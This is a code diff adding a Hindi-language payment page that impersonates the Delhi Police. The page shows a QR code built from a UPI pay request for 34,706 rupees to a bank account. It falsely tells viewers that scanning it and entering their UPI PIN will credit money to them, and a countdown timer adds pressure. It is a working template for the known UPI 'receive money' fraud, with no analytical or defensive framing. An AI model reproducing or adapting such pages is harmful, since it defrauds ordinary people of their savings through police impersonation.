@@ -1,0 +1,116 @@
+<!DOCTYPE html>  <html lang="hi">  
+<head>  
+<meta charset="utf-8" />  
+<meta name="viewport" content="width=device-width,initial-scale=1" />  
+<title>UPI QR — भुगतान पृष्ठ</title>  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>  
+<style>  
+  :root{  
+    --bg1:#050b1e; --bg2:#0d1a40;  
+    --card:#0f172a; --accent:#06b6d4;  
+    --text:#e6eef8; --muted:#cfe7f3;  
+  }  
+  *{box-sizing:border-box;margin:0;padding:0}  
+  body{  
+    min-height:100vh;  
+    display:flex;  
+    align-items:center;  
+    justify-content:center;  
+    font-family:'Segoe UI',Arial,sans-serif;  
+    background:linear-gradient(135deg,var(--bg1),var(--bg2));  
+    color:var(--text);  
+    padding:20px;  
+  }  
+  .card{  
+    width:100%;  
+    max-width:720px;  
+    background:rgba(255,255,255,0.05);  
+    border-radius:16px;  
+    padding:22px;  
+    box-shadow:0 8px 40px rgba(0,0,0,0.5);  
+    text-align:center;  
+    border:1px solid rgba(255,255,255,0.08);  
+    backdrop-filter:blur(8px);  
+  }  
+  .logo img{  
+    width:120px;  
+    border-radius:8px;  
+    background:#fff;  
+    padding:6px;  
+    box-shadow:0 4px 12px rgba(0,0,0,0.25);  
+  }  
+  h2{  
+    margin:14px 0 8px;  
+    color:var(--accent);  
+    font-size:22px;  
+  }  
+  #qrcode{  
+    margin:18px auto;  
+    background:#fff;  
+    padding:12px;  
+    border-radius:10px;  
+    display:inline-block;  
+    box-shadow:0 0 12px rgba(0,0,0,0.3);  
+  }  
+  .timer{  
+    margin-top:12px;  
+    font-family:monospace;  
+    font-size:18px;  
+    color:var(--accent);  
+    background:rgba(255,255,255,0.05);  
+    padding:8px 14px;  
+    border-radius:8px;  
+    display:inline-block;  
+  }  
+  .notice{  
+    text-align:left;  
+    margin-top:20px;  
+    background:rgba(255,255,255,0.04);  
+    padding:16px;  
+    border-radius:10px;  
+    font-size:14px;  
+    color:var(--muted);  
+    line-height:1.5;  
+  }  
+  .notice b{color:var(--text);}  
+</style>  
+</head>  
+<body>  
+  <div class="card">  
+    <div class="logo">  
+      <img src="delhi_police_logo.jpg" alt="Delhi Police Logo">  
+    </div>  <h2भुगतानप्राप्त करनेन हेतु QR कोड</h2>  
+<p>कृपया नीचे दिए गए QR कोड को स्कैन करें</p>  
+
+<div id="qrcode"></div>  
+
+<div id="timer" class="timer">00:30</div>  
+
+<div class="notice">  
+  <p><b>नोट:</b> कृपया इस QR कोड को स्कैन करें, अपनी UPI PIN डालें और अनुमति देकर यह राशि अपने खाते में प्राप्त करें।</p>  
+  <p><b>महत्वपूर्ण:</b> अपना UPI PIN या OTP किसी के साथ साझा न करें। यह जानकारी गोपनीय है।</p>  
+  <p>धन्यवाद — आपकी सुरक्षा हमारे लिए सर्वोपरि है।</p>  
+</div>
+
+  </div>  <script>  
+  // Generate QR dynamically  
+  const upiLink = "upi://pay?pa=MAB.037214043140071@AXISBANK&am=34706.00&cu=INR&tn=Payment";  
+  new QRCode(document.getElementById("qrcode"), {  
+    text: upiLink,  
+    width: 220,  
+    height: 220  
+  });  
+  
+  // 20-second timer  
+  let sec = 20;  
+  const timerEl = document.getElementById("timer");  
+  const interval = setInterval(()=>{  
+    sec--;  
+    timerEl.textContent = "00:" + (sec<10 ? "0"+sec : sec);  
+    if(sec <= 0){  
+      clearInterval(interval);  
+      timerEl.textContent = "समय समाप्त";  
+    }  
+  },1000);  
+</script>  </body>  
+</html>
